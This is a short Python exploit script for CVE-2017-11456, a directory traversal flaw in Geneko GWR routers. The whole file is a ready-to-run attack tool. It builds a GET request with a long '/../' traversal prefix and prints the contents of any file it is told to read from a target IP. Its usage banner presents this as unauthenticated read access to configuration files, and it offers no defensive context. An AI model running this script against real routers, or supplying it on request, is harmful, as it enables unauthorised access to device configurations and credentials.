# probleme with simple get request and path traversal attacks https://stackoverflow.com/questions/61337213/path-traversal-with-python-request
# https://nvd.nist.gov/vuln/detail/CVE-2017-11456
# https://github.com/BaadMaro/

import requests
import optparse

def exploit(target, filename):
    
    path = "/../../../../../../../../../../../../"
    url = "http://" + str(target) + str(path) +  str(filename) 
    #headers = {"User-Agent": "test", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close"}
    s = requests.Session()
    r = requests.Request(method='GET', url=url)
    prep = r.prepare()
    prep.url = url 
    response = s.send(prep)

    print(response.content.decode('utf-8'))
    return

def main():
    parser = optparse.OptionParser("""
CVE-2017-11456

Geneko GWR routers allow directory traversal sequences starting with a /../ substring, as demonstrated by unauthenticated read access to the configuration file. 


Usage: 
	 - python3 CVE-2017-11456.py -H "target ip" -f "file to read"
	 - You can list also files in a directory but the output is an html index -> list directory files [TO DO]
	       python3 CVE-2017-11456.py -H "target ip" -f "directory"


""")
    parser.add_option('-H', dest='target', type='string',\
      help='specify target ')
    parser.add_option('-f', dest='filename', type='string',\
      help='specify filename or directory')

    (options, args) = parser.parse_args()

    target = options.target
    filename = options.filename

    if (target == None) | (filename == None):
      print(parser.usage)
      exit(0)

    exploit(target, filename)


if __name__ == '__main__':
    main()
